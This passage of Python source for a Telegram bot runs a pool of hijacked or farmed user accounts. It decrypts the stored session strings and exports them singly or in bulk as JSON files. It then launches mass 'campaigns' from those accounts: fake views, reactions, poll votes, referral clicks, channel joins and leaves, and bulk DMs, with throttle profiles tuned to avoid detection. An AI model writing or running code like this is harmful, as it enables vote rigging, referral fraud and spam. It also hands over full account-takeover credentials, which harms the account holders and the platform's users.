    async with aiosqlite.connect(db_mgr.db_path) as db:
        row = await (await db.execute("SELECT session_string FROM accounts WHERE phone = ?", (phone,))).fetchone()
    if not row: return
    f = BufferedInputFile(decrypt_data(row[0]).encode('utf-8'), filename=f"string_{phone}.txt")
    await callback.message.reply_document(document=f, caption=f"✨ Dynamic parameters dump extraction mapped clean for index token code: `+{phone}`")

@router.callback_query(F.data.startswith("export_multi_start:"))
async def export_multi_dashboard(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    if await db_mgr.get_user_role(callback.from_user.id) != "super_owner": return
    page = int(callback.data.split(":")[1])
    sel = (await state.get_data()).get("multi_export_selected", [])
    limit, offset = 10, page * 10
    import aiosqlite
    async with aiosqlite.connect(db_mgr.db_path) as db:
        total = (await (await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'")).fetchone())[0]
        rows = await (await db.execute("SELECT phone FROM accounts WHERE status = 'active' LIMIT ? OFFSET ?", (limit, offset))).fetchall()

    buttons = []
    for r in rows:
        chk = "💎 " if r[0] in sel else "⬜ "
        buttons.append([InlineKeyboardButton(text=f"{chk}+{r[0]}", callback_data=f"toggle_ex_ph:{r[0]}:{page}")])
    nav = []
    if page > 0: nav.append(InlineKeyboardButton(text="⬅️ Back", callback_data=f"export_multi_start:{page - 1}"))
    if offset + limit < total: nav.append(InlineKeyboardButton(text="Next ➡️", callback_data=f"export_multi_start:{page + 1}"))
    if nav: buttons.append(nav)
    buttons.append([InlineKeyboardButton(text="📦 Extract Selected Assembly Pack", callback_data="execute_multi_export")])
    buttons.append([InlineKeyboardButton(text="🔙 Cancel", callback_data="export_dashboard_root")])
    await callback.message.edit_text("Select multi-target profiles to include inside custom parameters compilation array matrix package:", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
    await state.set_state(ExportWizardStates.selecting_multi)

@router.callback_query(StateFilter(ExportWizardStates.selecting_multi), F.data.startswith("toggle_ex_ph:"))
async def handle_toggle_export_ph(callback: CallbackQuery, state: FSMContext):
    await callback.answer(); parts = callback.data.split(":"); ph, page = parts[1], int(parts[2])
    sel = (await state.get_data()).get("multi_export_selected", [])
    sel.remove(ph) if ph in sel else sel.append(ph)
    await state.update_data(multi_export_selected=sel)
    callback.data = f"export_multi_start:{page}"
    await export_multi_dashboard(callback, state)

@router.callback_query(StateFilter(ExportWizardStates.selecting_multi), F.data == "execute_multi_export")
async def execute_multi_export(callback: CallbackQuery, state: FSMContext):
    if await db_mgr.get_user_role(callback.from_user.id) != "super_owner": return
    sel = (await state.get_data()).get("multi_export_selected", [])
    if not sel: await callback.answer("⚠️ Select targets first.", show_alert=True); return
    await callback.answer(); payload = []
    import aiosqlite
    async with aiosqlite.connect(db_mgr.db_path) as db:
        for ph in sel:
            r = await (await db.execute("SELECT phone, user_id, username, session_string FROM accounts WHERE phone = ?", (ph,))).fetchone()
            if r: payload.append({"phone": r[0], "user_id": r[1], "username": r[2], "session_string": decrypt_data(r[3])})
    f = BufferedInputFile(json.dumps(payload, indent=4).encode('utf-8'), filename="multi_sessions_bundle.txt")
    await callback.message.reply_document(document=f, caption=f"📦 Extraction batch sequence complete: Linked `{len(payload)}` elements output logs.")
    await state.clear()

@router.callback_query(F.data == "bulk_admin_export")
async def handle_bulk_admin_export(callback: CallbackQuery):
    await callback.answer()
    if await db_mgr.get_user_role(callback.from_user.id) != "super_owner": return
    import aiosqlite
    async with aiosqlite.connect(db_mgr.db_path) as db:
        rows = await (await db.execute("SELECT phone, user_id, username, session_string FROM accounts WHERE status='active'")).fetchall()
    if not rows: return
    payload = [{"phone": r[0], "user_id": r[1], "username": r[2], "session_string": decrypt_data(r[3])} for r in rows]
    f = BufferedInputFile(json.dumps(payload, indent=4).encode('utf-8'), filename="bulk_admin_sessions.txt")
    await callback.message.reply_document(document=f, caption=f"📦 Master Repository Export Complete: `{len(payload)}` runtime tokens mapped.")

# --- BACKUP STORAGE MANAGEMENT HUB ---
@router.callback_query(F.data == "backup_panel")
async def backup_panel(callback: CallbackQuery):
    await callback.answer()
    if await db_mgr.get_user_role(callback.from_user.id) not in ["owner", "super_owner"]: return
    buttons = [[InlineKeyboardButton(text="📥 Pull Backup Database (.db)", callback_data="export_db")],
               [InlineKeyboardButton(text="📂 Structural Import Mapping Update", callback_data="import_db_start")],
               [InlineKeyboardButton(text="🔙 Main Menu Control Room", callback_data="main_menu")]]
    await callback.message.edit_text("💾 **Core Database Storage Management Interface**", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

@router.callback_query(F.data == "import_db_start")
async def import_db_start(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    if await db_mgr.get_user_role(callback.from_user.id) not in ["owner", "super_owner"]: return
    await callback.message.edit_text("📤 Upload current system structural layout SQL database snapshot binary file with `.db` formatting:")
    await state.set_state(RegistrationStates.waiting_for_db_file)

@router.message(StateFilter(RegistrationStates.waiting_for_db_file), F.document)
async def process_db_import_file(message: Message, state: FSMContext, bot: Bot):
    if await db_mgr.get_user_role(message.from_user.id) not in ["owner", "super_owner"]: return
    if not message.document.file_name.endswith('.db'): await state.clear(); return
    status = await message.answer("🔄 Restructuring dataset relations into core nodes layout schema...")
    tmp = f"imported_temp_{message.from_user.id}.db"
    try:
        await bot.download_file((await bot.get_file(message.document.file_id)).file_path, destination=tmp)
        u_cnt = a_cnt = 0
        import aiosqlite
        async with aiosqlite.connect(tmp) as s_db:
            try:
                async with s_db.execute("SELECT user_id, username, role, max_accounts FROM users") as cur:
                    async for r in cur:
                        async with aiosqlite.connect(db_mgr.db_path) as c_db:
                            await c_db.execute("INSERT OR IGNORE INTO users (user_id, username, role, max_accounts) VALUES (?, ?, ?, ?)", (r[0], r[1], r[2], r[3]))
                            await c_db.commit()
                        u_cnt += 1
            except Exception: pass
            try:
                async with s_db.execute("SELECT phone, user_id, username, session_string, status FROM accounts") as cur:
                    async for r in cur:
                        async with aiosqlite.connect(db_mgr.db_path) as c_db:
                            await c_db.execute("INSERT OR REPLACE INTO accounts (phone, user_id, username, session_string, status, last_active) VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)", (str(r[0]), r[1], r[2], r[3], r[4]))
                            await c_db.commit()
                        a_cnt += 1
            except Exception: pass
        await status.edit_text(f"✅ **Database Sync Sequence Executed**\n👤 Synchronized Accounts: `{u_cnt}`\n📱 Session Channels Remapped: `{a_cnt}`")
    except Exception as e: await status.edit_text(f"❌ Structural Merge Failure Trace: {e}")
    finally:
        if os.path.exists(tmp): os.remove(tmp)
        await state.clear()

@router.callback_query(F.data == "export_db")
async def export_db(callback: CallbackQuery):
    await callback.answer()
    if await db_mgr.get_user_role(callback.from_user.id) not in ["owner", "super_owner"]: return
    try:
        with open(db_mgr.db_path, "rb") as f: file = BufferedInputFile(f.read(), filename="database_core_backup.db")
        await callback.message.reply_document(file, caption="📂 Current Core Database Snapshot")
    except Exception as e: await callback.message.answer(f"❌ Snapshot Extraction Error: {e}")

# --- DYNAMIC MULTI-STAGE CAMPAIGN WIZARD WORKFLOW ---
@router.callback_query(F.data == "task_hub_start")
async def task_hub_select_type(callback: CallbackQuery, state: FSMContext):
    await callback.answer(); await state.clear()
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)
    
    # Super Owner Scope Switch Interception Configuration Check
    if role == "super_owner":
        buttons = [
            [InlineKeyboardButton(text="👤 Use My Personal Accounts", callback_data="set_scope:personal")],
            [InlineKeyboardButton(text="🌐 Use Global Master Platform Pool", callback_data="set_scope:global")]
        ]
        await callback.message.edit_text("⚡ **Isolation Control Protocol**: Specify target processing database partition strategy boundary parameters context:", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
        await state.set_state(TaskWizardStates.waiting_for_scope_selection)
    else:
        await state.update_data(scope_choice="global")
        await route_to_task_type_selection(callback.message, state, user_id)

@router.callback_query(StateFilter(TaskWizardStates.waiting_for_scope_selection), F.data.startswith("set_scope:"))
async def handle_scope_selected(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    scope = callback.data.split(":")[1]
    await state.update_data(scope_choice=scope)
    await route_to_task_type_selection(callback.message, state, callback.from_user.id)

async def route_to_task_type_selection(message: Message, state: FSMContext, user_id: int):
    role = await db_mgr.get_user_role(user_id)
    data = await state.get_data()
    scope_choice = data.get("scope_choice", "global")
    
    import aiosqlite
    async with aiosqlite.connect(db_mgr.db_path) as db:
        if role == "super_owner" and scope_choice == "personal":
            q = "SELECT COUNT(*) FROM accounts WHERE status = 'active' AND user_id = ?"
            count = (await (await db.execute(q, (user_id,))).fetchone())[0]
        elif role in ["admin", "owner", "super_owner"]:
            # Standard admin cannot leverage super owner sessions
            super_owner_placeholders = ",".join(map(str, config.SUPER_OWNER_IDS)) if role != "super_owner" else "0"
            q = f"SELECT COUNT(*) FROM accounts WHERE status = 'active' AND user_id NOT IN ({super_owner_placeholders})"
            count = (await (await db.execute(q)).fetchone())[0]
        else:
            q = "SELECT COUNT(*) FROM accounts WHERE status = 'active' AND user_id = ?"
            count = (await (await db.execute(q, (user_id,))).fetchone())[0]

    text = f"✨ **Campaign Deployer Panel Grid**\n-----------------------------\n📱 System Online Active Profiles Matrix: `{count}` profiles available.\n📦 Selection Partition Strategy Scope: `{scope_choice.upper()}`\n\nStep 1: Choose deployment execution template profile layout framework:"
    if isinstance(message, CallbackQuery):
        await message.message.edit_text(text=text, reply_markup=get_task_types_keyboard())
    else:
        await message.edit_text(text=text, reply_markup=get_task_types_keyboard())
    await state.set_state(TaskWizardStates.choosing_type)

@router.callback_query(StateFilter(TaskWizardStates.choosing_type), F.data.startswith("set_type:"))
async def task_hub_process_type(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    task_type = callback.data.split(":")[1]
    await state.update_data(task_type=task_type)
    
    if task_type == "leave":
        buttons = [
            [InlineKeyboardButton(text="🔗 Outbound target: Single Channel Link", callback_data="leave_mode:single")],
            [InlineKeyboardButton(text="💥 Complete Nuke: Leave ALL Group/Channels", callback_data="leave_mode:all")],
            [InlineKeyboardButton(text="🔙 Return Menu", callback_data="task_hub_start")]
        ]
        await callback.message.edit_text("Step 2: Define channel leave logic tracking configuration rule parameters context:", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
        await state.set_state(TaskWizardStates.waiting_for_leave_choice)
    elif "react" in task_type or "vote" in task_type or task_type in ["view", "speed"]:
        await callback.message.edit_text("Step 2: Enter target handle name parameter, public string layout path or absolute URL address space (e.g. `@channel`):")
        await state.set_state(TaskWizardStates.waiting_for_channel_link)
    elif task_type == "refer":
        await callback.message.edit_text("Step 2: Paste your automated tracking dynamic URL string reference index layout token parameters (e.g. `https://t.me/Bot?start=ref_101`):")
        await state.set_state(TaskWizardStates.waiting_for_post_link)
    else:
        await callback.message.edit_text("Step 2: Paste targeted processing destination address component parameter value:")
        await state.set_state(TaskWizardStates.waiting_for_post_link)

@router.callback_query(StateFilter(TaskWizardStates.waiting_for_leave_choice), F.data.startswith("leave_mode:"))
async def task_hub_process_leave_choice(callback: CallbackQuery, state: FSMContext):
    await callback.answer(); mode = callback.data.split(":")[1]; await state.update_data(leave_mode=mode)
    if mode == "all":
        await state.update_data(target="ALL SYSTEMS ACTIVE EXECUTION DESTINATIONS NUKE")
        await route_to_speed_profile_selection(callback.message, state)
    else:
        await callback.message.edit_text("Step 3: Paste target link layout destination address reference token context standard that IDs should leave from:")
        await state.set_state(TaskWizardStates.waiting_for_post_link)

@router.message(StateFilter(TaskWizardStates.waiting_for_channel_link))
async def task_hub_process_channel_link(message: Message, state: FSMContext):
    await state.update_data(channel_target=message.text.strip())
    await message.answer("Step 3: Provide explicit message post track unique numerical identification reference link token address mapping parameters (e.g. `https://t.me/channel/582`):")
    await state.set_state(TaskWizardStates.waiting_for_post_link)

@router.message(StateFilter(TaskWizardStates.waiting_for_post_link))
async def task_hub_process_target(message: Message, state: FSMContext):
    target = message.text.strip(); await state.update_data(target=target)
    task_type = (await state.get_data()).get("task_type")
    
    if task_type in ["join", "leave", "refer", "view", "speed"]:
        await route_to_speed_profile_selection(message, state)
    elif "react" in task_type:
        await state.update_data(selected_emojis=[])
        await message.answer("Step 4: Select targeted reaction emojis from the selection grid layout configuration block components:", reply_markup=get_emoji_selection_keyboard([]))
        await state.set_state(TaskWizardStates.waiting_for_emojis)
    elif "vote" in task_type:
        await message.answer("Step 4: Choose the architecture parsing mode tracking protocol template configurations for interactive voting targets:", reply_markup=get_vote_mode_keyboard())
        await state.set_state(TaskWizardStates.waiting_for_vote_mode)
    elif task_type == "dm":
        await message.answer("Step 4: Write message content structural data string array to distribute:")
        await state.set_state(TaskWizardStates.waiting_for_dm_text)

@router.callback_query(StateFilter(TaskWizardStates.waiting_for_emojis), F.data.startswith("toggle_emoji:"))
async def handle_toggle_emoji(callback: CallbackQuery, state: FSMContext):
    await callback.answer(); emoji = callback.data.split(":")[1]; data = await state.get_data(); sel = data.get("selected_emojis", [])
    sel.remove(emoji) if emoji in sel else sel.append(emoji)
    await state.update_data(selected_emojis=sel)
    await callback.message.edit_reply_markup(reply_markup=get_emoji_selection_keyboard(sel))

@router.callback_query(StateFilter(TaskWizardStates.waiting_for_emojis), F.data == "finish_emoji_selection")
async def finish_emoji_selection(callback: CallbackQuery, state: FSMContext):
    data = await state.get_data(); sel = data.get("selected_emojis", [])
    if not sel: await callback.answer("⚠️ Highlight at least 1 option target index value.", show_alert=True); return
    await callback.answer(); await state.update_data(reactions=sel)
    if "vote" in data.get("task_type"):
        await callback.message.answer("Step 5: Choose the architecture parsing mode tracking protocol template configurations for interactive voting targets:", reply_markup=get_vote_mode_keyboard())
        await state.set_state(TaskWizardStates.waiting_for_vote_mode)
    else: 
        await route_to_speed_profile_selection(callback.message, state)

@router.callback_query(StateFilter(TaskWizardStates.waiting_for_vote_mode), F.data.startswith("vote_mode:"))
async def handle_vote_mode_selection(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    v_mode = callback.data.split(":")[1]
    await state.update_data(vote_mode=v_mode)
    if v_mode == "text":
        await callback.message.edit_text("Step 5: Type the exact matching text label payload string pattern string parameter present inside the target click button index layout properties:")
    else:
        await callback.message.edit_text("Step 5: Type or input the clean identical raw emoji characters match mapping variable targeted for execution interaction clicks:")
    await state.set_state(TaskWizardStates.waiting_for_vote_value)

@router.message(StateFilter(TaskWizardStates.waiting_for_vote_value))
async def process_vote_value_input(message: Message, state: FSMContext):
    await state.update_data(vote_value=message.text.strip())
    await route_to_speed_profile_selection(message, state)

@router.message(StateFilter(TaskWizardStates.waiting_for_dm_text))
async def process_dm_text(message: Message, state: FSMContext):
    await state.update_data(text=message.text.strip())
    await route_to_speed_profile_selection(message, state)

async def route_to_speed_profile_selection(message: Message, state: FSMContext):
    text = "🔢 **Select Campaign Execution Speed & Throttle Risk Profile Profile**:\n\nChoose delay intervals mapping constraints across computing threads parameters metrics:"
    if isinstance(message, Message):
        await message.answer(text, reply_markup=get_speed_profiles_keyboard())
    else:
        await message.edit_text(text, reply_markup=get_speed_profiles_keyboard())
    await state.set_state(TaskWizardStates.waiting_for_speed_profile)

@router.callback_query(StateFilter(TaskWizardStates.waiting_for_speed_profile), F.data.startswith("speed_prof:"))
async def handle_speed_profile_selected(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    delay = float(callback.data.split(":")[1])
    await state.update_data(delay_interval=delay)
    
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)
    data = await state.get_data()
    scope_choice = data.get("scope_choice", "global")
    
    import aiosqlite
    async with aiosqlite.connect(db_mgr.db_path) as db:
        if role == "super_owner" and scope_choice == "personal":
            q = "SELECT COUNT(*) FROM accounts WHERE status = 'active' AND user_id = ?"
            max_available = (await (await db.execute(q, (user_id,))).fetchone())[0]
        elif role in ["admin", "owner", "super_owner"]:
            super_owner_placeholders = ",".join(map(str, config.SUPER_OWNER_IDS)) if role != "super_owner" else "0"
            q = f"SELECT COUNT(*) FROM accounts WHERE status = 'active' AND user_id NOT IN ({super_owner_placeholders})"
            max_available = (await (await db.execute(q)).fetchone())[0]
        else:
            q = "SELECT COUNT(*) FROM accounts WHERE status = 'active' AND user_id = ?"
            max_available = (await (await db.execute(q, (user_id,))).fetchone())[0]
        
    prompt_msg = f"🔢 **Account Scaling Allocation Variable**\n\nTotal compliant matching active connection token instances detected: `{max_available}`\nInput exact execution account scale capacity integer block dimension to bind:\n(Type `0` to load and maximize complete available pool allocation layout structures)"
    await callback.message.edit_text(prompt_msg)
    await state.set_state(TaskWizardStates.waiting_for_account_scale)

@router.message(StateFilter(TaskWizardStates.waiting_for_account_scale))
async def process_account_scale(message: Message, state: FSMContext, bot: Bot):
    txt = message.text.strip()
    if not txt.isdigit(): 
        await message.answer("❌ Invalid data entry constraints framework. Pass numerical values only:"); return
    req = int(txt)
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    data = await state.get_data()
    scope_choice = data.get("scope_choice", "global")
    
    import aiosqlite
    async with aiosqlite.connect(db_mgr.db_path) as db:
        if role == "super_owner" and scope_choice == "personal":
            q = "SELECT COUNT(*) FROM accounts WHERE status = 'active' AND user_id = ?"
            lim = (await (await db.execute(q, (user_id,))).fetchone())[0]
        elif role in ["admin", "owner", "super_owner"]:
            super_owner_placeholders = ",".join(map(str, config.SUPER_OWNER_IDS)) if role != "super_owner" else "0"
            q = f"SELECT COUNT(*) FROM accounts WHERE status = 'active' AND user_id NOT IN ({super_owner_placeholders})"
            lim = (await (await db.execute(q)).fetchone())[0]
        else:
            q = "SELECT COUNT(*) FROM accounts WHERE status = 'active' AND user_id = ?"
            lim = (await (await db.execute(q, (user_id,))).fetchone())[0]

    if req > lim: 
        await message.answer(f"❌ Selection dynamic boundary exceeded active configuration metrics bounds tracking: `{lim}` available nodes. Scale constraints down safely:"); return
    await state.update_data(run_account_count=req)
    await finalize_task_creation(message, state, bot)

async def finalize_task_creation(message: Message, state: FSMContext, bot: Bot):
    data = await state.get_data(); user_id = message.chat.id
    task_type = data.pop("task_type"); target = data.get("target", "")
    if data.get("leave_mode") != "all":
        _, link_msg_id = parse_telegram_link(target)
        if link_msg_id: data["msg_id"] = link_msg_id

    init_msg = await bot.send_message(chat_id=user_id, text="⏳ **Bootstrapping Core Campaign Component Engine**\nAssembling dataset shards across network lines...")
    import aiosqlite
    async with aiosqlite.connect(db_mgr.db_path) as db:
        cursor = await db.execute("INSERT INTO tasks (creator_id, type, payload) VALUES (?, ?, ?)", (user_id, task_type, json.dumps(data)))
        task_id = cursor.lastrowid; await db.commit()

    await task_queue.add_task(task_id, user_id, task_type, data, bot, init_msg.message_id)
    await state.clear()

# --- REALTIME METRICS MONITORING INFRASTRUCTURE ---
@router.callback_query(F.data == "view_tasks")
async def view_tasks(callback: CallbackQuery):
    await callback.answer(); user_id = callback.from_user.id; role = await db_mgr.get_user_role(user_id)
    import aiosqlite
    async with aiosqlite.connect(db_mgr.db_path) as db:
        if role in ["admin", "owner", "super_owner"]:
            q = "SELECT task_id, type, status, progress FROM tasks ORDER BY task_id DESC LIMIT 10"
            rows = await (await db.execute(q)).fetchall()
        else:
            q = "SELECT task_id, type, status, progress FROM tasks WHERE creator_id = ? ORDER BY task_id DESC LIMIT 10"
            rows = await (await db.execute(q, (user_id,))).fetchall()
            
    text = "📊 **Historical Logging Event Feed Matrix**\n\n"
    for r in rows: 
        text += f"🔹 Task Node: `#{r[0]}` | Action: `{r[1].upper()}`\nState Context: `{r[2].upper()}` | Metric Track: `{r[3]}`\nTo pull metrics layout: `/taskreport_{r[0]}`\n\n"
    await callback.message.edit_text(text or "No metrics logging tracks present inside data repository core blocks.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[[InlineKeyboardButton(text="🔙 Return Menu", callback_data="main_menu")]]]))

@router.message(F.text.startswith("/taskreport_"))
async def cmd_task_report(message: Message):
    role = await db_mgr.get_user_role(message.from_user.id)
    try: task_id = int(message.text.split("_")[1])
    except: return
    import aiosqlite
    async with aiosqlite.connect(db_mgr.db_path) as db:
        row = await (await db.execute("SELECT creator_id, type, status, progress FROM tasks WHERE task_id = ?", (task_id,))).fetchone()
    if not row or (role not in ["admin", "owner", "super_owner"] and row[0] != message.from_user.id): return
    await message.answer(f"📊 **Operational Profile Sheet** ID: `#{task_id}`\n\nType Element: `{row[1].upper()}`\nStatus Configuration: `{row[2].upper()}`\nExecution Parameter Tracking Level: `{row[3]}`", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[[InlineKeyboardButton(text="🔙 Return Main Menu", callback_data="main_menu")]]]))

@router.callback_query(F.data == "view_referrals")
async def view_referrals(callback: CallbackQuery):
    await callback.answer()
    import aiosqlite
    async with aiosqlite.connect(db_mgr.db_path) as db:
        count = (await (await db.execute("SELECT COUNT(*) FROM users WHERE referred_by = ?", (callback.from_user.id,))).fetchone())[0]
    await callback.message.edit_text(f"👥 **Invitation Tracking Nodes Matrix**\n\nDistribute verification URL parameters path key to register lines under profile:\n`https://t.me/{bot_username}?start=ref_{callback.from_user.id}`\n\nTotal active referral registrations registered: `{count}`", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[[InlineKeyboardButton(text="🔙 Back Node Menu", callback_data="main_menu")]]]))

@router.callback_query(F.data == "admin_panel")
async def handle_admin_panel(callback: CallbackQuery):
    await callback.answer()
    await callback.message.edit_text("🛠️ **Core Administrative Operations Dashboard**\n\nDistributed operational terminal input commands lines syntax available:\n🔹 `/addadmin <user_id> <scale_limit>`\n🔹 `/removeadmin <user_id>`\n🔹 `/broadcast` - Network Broadcast Push\n🔹 `/canceltasks` - Kill running async tasks", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[[InlineKeyboardButton(text="🔙 Return Core Room", callback_data="main_menu")]]]))

@router.callback_query(F.data == "system_stats")
async def system_stats(callback: CallbackQuery):
    await callback.answer()
    if await db_mgr.get_user_role(callback.from_user.id) != "super_owner": return
    import aiosqlite
    async with aiosqlite.connect(db_mgr.db_path) as db:
        total_users = (await (await db.execute("SELECT COUNT(*) FROM users")).fetchone())[0]
        total_accounts = (await (await db.execute("SELECT COUNT(*) FROM accounts")).fetchone())[0]
        active_accounts = (await (await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'")).fetchone())[0]
        user_rows = await (await db.execute("SELECT user_id, username, role FROM users WHERE role = 'admin' OR user_id IN (SELECT DISTINCT user_id FROM accounts)")).fetchall()
        
        metrics = "\n👥 **Platform Distributed Allocation Schema Layout**:\n"
        for u_id, u_name, u_role in user_rows:
            acc_count = (await (await db.execute("SELECT COUNT(*) FROM accounts WHERE user_id = ?", (u_id,))).fetchone())[0]
            metrics += f"• Endpoint Identity Node: `{u_id}` (`@{u_name or 'NoHandle'}`) [{u_role.upper()}] ➜ Linked Channels: `{acc_count}` accounts\n"
            
    await callback.message.edit_text(text=f"📈 **Global Framework Telemetry Feed Summary**\n\n👥 Registered Users Grid: `{total_users}`\n📱 Total Linked Sessions: `{total_accounts}`\n🟢 Active Verified Tokens: `{active_accounts}`\n----------------------------------------\n{metrics}", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[[InlineKeyboardButton(text="🔙 Exit Telemetry Dashboard", callback_data="main_menu")]]]))
